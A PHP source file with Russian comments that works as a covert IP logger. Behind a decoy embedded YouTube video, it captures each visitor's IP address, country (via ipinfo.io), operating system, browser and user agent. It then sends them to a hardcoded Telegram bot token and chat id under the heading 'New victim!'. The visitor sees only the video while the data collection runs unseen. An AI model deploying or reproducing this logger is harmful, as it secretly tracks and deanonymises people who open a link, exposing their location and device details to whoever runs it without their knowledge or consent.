<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
// Получаем название ОС
function getOS() {

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/kalilinux/i'          =>  'KaliLinux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
                            '/Windows Phone/i'      =>  'Windows Phone'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}
//
// Получаем браузер
function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/Mozilla/i'    =>  'Mozila',
                            '/Mozilla/5.0/i'=>  'Mozila',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
                            '/OPR/i'        =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/Bot/i'        =>  'BOT Browser',
                            '/Valve Steam GameOverlay/i'  =>  'Steam',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();



// Получаем ip посетителя
$ip = $_SERVER['REMOTE_ADDR'];
// Получаем инфу откуда перешел
$site_refer = $_SERVER['HTTP_REFERER'];
    if($site_refer == ""){
        $site = "dirrect connection";
    }
    else{
        $site = $site_refer;
    }
  // Hide ownr's IP address
    $absdfs5sd4 = "HIDE THIS IP ADDRESS";//Ваш ip
    $owner_country = "YOUR COUNTRY TAG FOR YOUR IP ↑"; //Это можете не менять
  
    if($ip == $absdfs5sd4){
        $ip = "Owner"; 
        $country = $owner_country;
    }
  //Инфа о стране
    else{
        $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
        $country = $details->country;
    }
    // Отправка данных.
 $token = "5535747218:AAF5Orv3Jm5UNq-3vK-S6uQ3nKbgGkSFPts"; //Токен бота с @BotFather
 $chat_id = "829931078";// Ваш chat id
 $txt = urlencode("Новая жертва!\nIP:{$ip}\nСтрана:{$country}\nОС:{$user_os}\nБраузер:{$user_browser}\nUser Agent:{$user_agent}");
 $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

?>
<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
